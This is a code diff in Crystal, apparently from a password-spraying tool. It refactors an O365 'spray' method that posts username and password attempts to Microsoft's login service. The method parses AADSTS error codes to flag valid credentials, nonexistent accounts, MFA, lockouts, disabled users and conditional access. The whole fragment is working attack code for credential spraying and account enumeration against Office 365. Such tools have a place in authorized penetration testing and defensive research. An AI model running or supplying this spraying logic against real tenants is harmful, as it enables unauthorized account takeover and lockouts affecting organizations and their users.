@@ -3,11 +3,14 @@ require "http/client"
 class O365 < Sprayer
 
     # returns an array of [username, password, valid, lockout, mfa]
-    def spray(username : String, password : String) 
+    def spray(username : String, password : String) : SprayStatus
         # set default return values
-        lockout = false
-        mfa = false 
-        valid = false
+        # lockout = false
+        # mfa = false 
+        # valid = false
+        spstatus = SprayStatus.new()
+        spstatus.username = username 
+        spstatus.password = password
 
         
         # url = "login.microsoft.com"
@@ -50,7 +53,7 @@ class O365 < Sprayer
                 page = client.post( "#{url.path}" , headers: header, form: bodyparams )
             rescue e
                 # STDERR.puts  e.message 
-                STDERR.puts "ERROR: oops something happend (blame dns) Retrying..."
+                STDERR.puts "ERROR: oops something happend (blame dns) Retrying... (might not be a bad idea to slow down or stop for a bit)"
                 sleep 2 
             end
         end
@@ -71,14 +74,20 @@ class O365 < Sprayer
 
         if page.body.includes? "AADSTS50034"
             STDERR.puts "The user account #{username} does not exist in the #{username.split("@")[1].to_s} directory."
+            spstatus.invalid_username = true 
         end
 
 
-        mfa = true if page.body.includes? "AADSTS50158" # mfa duo or other ( conditionall access )
-        mfa = true if page.body.includes? "AADSTS50079" # mfa microsoft
-        mfa = true if page.body.includes? "AADSTS50076" # mfa microsoft
+        # mfa = true if page.body.includes? "AADSTS50158" # mfa duo or other ( conditionall access )
+        # mfa = true if page.body.includes? "AADSTS50079" # mfa microsoft
+        # mfa = true if page.body.includes? "AADSTS50076" # mfa microsoft
         # mfa = true if page.status_code == 
-        lockout = true if page.body.includes? "AADSTS50053" # locked out smartlock or regular 
+        spstatus.mfa = true if page.body.includes? "AADSTS50158" # mfa duo or other ( conditionall access )
+        spstatus.mfa = true if page.body.includes? "AADSTS50079" # mfa microsoft
+        spstatus.mfa = true if page.body.includes? "AADSTS50076" # mfa microsoft
+        # mfa = true if page.status_code == 
+        # lockout = true if page.body.includes? "AADSTS50053" # locked out smartlock or regular 
+        spstatus.lockedout = true if page.body.includes? "AADSTS50053" # locked out smartlock or regular 
 
         if page.body.includes? "AADSTS50057" 
             STDERR.puts "#{username} is Disabled"
@@ -86,15 +95,19 @@ class O365 < Sprayer
         
 
         # set the valid if returns 200 or if mfa also account is valid if conditional access is found 
-        valid = true if mfa || page.status_code == 200 
-        valid = true if page.body.includes? "AADSTS53003" 
+        # valid = true if mfa || page.status_code == 200 
+        spstatus.valid_credentials = true if spstatus.mfa || page.status_code == 200 
+        # valid = true if page.body.includes? "AADSTS53003" 
+        spstatus.valid_credentials = true if page.body.includes? "AADSTS53003" 
         puts "CONDITIONAL ACCESS enabled for #{username}!!!" if page.body.includes? "AADSTS53003"  # this is in the api request 
         if page.body.includes? "ConvergedConditionalAccess" # this is in the actual web html responce of the web page 
             puts "CONDITIONAL ACCESS enabled for #{username}!!!"
-            valid = true 
+            # valid = true 
+            spstatus.valid_credentials = true 
         end
 
         # puts "\t#{valid} Username: #{username}\t\tPassword: #{password} "
-        return [username,password,valid,lockout,mfa]
+        # return [username,password,valid,lockout,mfa]
+        return spstatus 
     end
 end 
